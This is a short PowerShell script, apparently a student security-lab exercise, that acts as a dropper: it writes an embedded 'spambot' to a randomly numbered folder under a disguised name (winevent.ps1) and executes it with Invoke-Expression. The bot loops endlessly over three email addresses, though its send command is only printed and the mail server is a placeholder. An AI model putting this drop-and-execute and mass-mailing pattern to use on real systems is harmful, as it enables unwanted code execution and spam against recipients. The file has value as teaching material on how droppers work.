<# 
    Storyline: Dropper for our spambot that will save to a directory
    and then execute it.
#>

$writeSbBot = @'
# Send an email using Powershell
$toSend = @('kathryn.hopkins@mymail.champlain.edu', 'kati@champlain.edu', 'hopk@champlain.edu')

# Message Body
$msg = "Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."

while ($true) {

    foreach($email in $toSend) {

        # Send the email
        write-host "Send-MailMessage -from 'kathryn.hopkins@mymail.champlain.edu' -To $email -Subject 'Tisk Tisk'
        -Body $msg -SmtpServer X.X.X.X"
        
        # Pause for 1 second
        start-sleep 1

    }

}
'@

# Directory to write the bot
$sbDir = 'C:\Users\kjhop\'

# Create a random numbe to add to the file
$sbRand = Get-Random -Minimum 1000 -Maximum 1999

$sbRand

# Create the file and location and save to the bot
# C:\Users\kjhop\winevent.ps1
$file = $sbDir + $sbRand + "\winevent.ps1"

# Write to a file
$writeSbBot | Out-File -FilePath $file

# Executes the Powershell script
Invoke-Expression $file
